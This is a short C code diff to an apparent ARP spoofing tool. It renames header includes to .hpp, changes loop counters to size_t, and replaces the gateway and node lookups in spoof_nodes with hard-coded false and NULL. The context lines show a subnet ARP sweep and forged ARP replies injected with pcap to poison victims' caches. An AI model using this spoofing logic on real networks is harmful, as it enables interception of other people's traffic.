@@ -2,12 +2,12 @@
 #include <assert.h>
 #include <string.h>
 
-#include "arputil.h"
-#include "nodes.h"
-#include "netinfo.h"
-#include "poluter.h"
-#include "debug.h"
-#include "util.h"
+#include "arputil.hpp"
+#include "nodes.hpp"
+#include "netinfo.hpp"
+#include "poluter.hpp"
+#include "debug.hpp"
+#include "util.hpp"
 
 
 static void survey_perform_survey(pcap_t *handler, const struct InterfaceInfo *current) {
@@ -21,7 +21,7 @@ static void survey_perform_survey(pcap_t *handler, const struct InterfaceInfo *c
 	size_t nodeCount = (1 << (32 - bitcount(current->netmask))) - 2;
 	uint32_t network = ntohl(current->addr.in & current->netmask);
 
-	for (int i = 0; i < nodeCount;  i++) {
+	for (size_t i = 0; i < nodeCount;  i++) {
 		uint32_t ip4addr = htonl(network + i + 1);
 		if (ip4addr != current->addr.in) {
 			arp_request_set_to_ip(buffer, ip4addr);
@@ -39,19 +39,19 @@ static void spoof_nodes(struct Poluter *self, struct NetAddress *targets, size_t
 	DINFO("%s\n", "Starting spoofing");
 
 	struct Node gateway;
-	bool hasGW = TsHashMap_get(self->nodes, &self->info.gateway, &gateway);
+	bool hasGW = false;
 	struct NetAddress current = self->info.addr;
 	size_t node_count = 0;
-	struct Node *nodes = TsHashMap_getAll(self->nodes, &node_count);
+	struct Node *nodes = NULL;
 
 	uint8_t buffer[ARP_IP4_SIZE] = {0};
-	for (int i = 0; i < targets_count; i++) {
+	for (size_t i = 0; i < targets_count; i++) {
 		struct NetAddress victim = targets[i];
 		if (hasGW) {
 			arp_reply_create(buffer, victim.in, current.hw, gateway.addr.in, gateway.addr.hw);
 			pcap_inject(self->handle, buffer, ARP_IP4_SIZE);
 		}
-		for (int i = 0; i < node_count; i++) {
+		for (size_t i = 0; i < node_count; i++) {
 			if (nodes[i].is_online && nodes[i].addr.in != victim.in) {
 				arp_reply_create(buffer, nodes[i].addr.in, current.hw, victim.in, victim.hw);
 				pcap_inject(self->handle, buffer, ARP_IP4_SIZE);
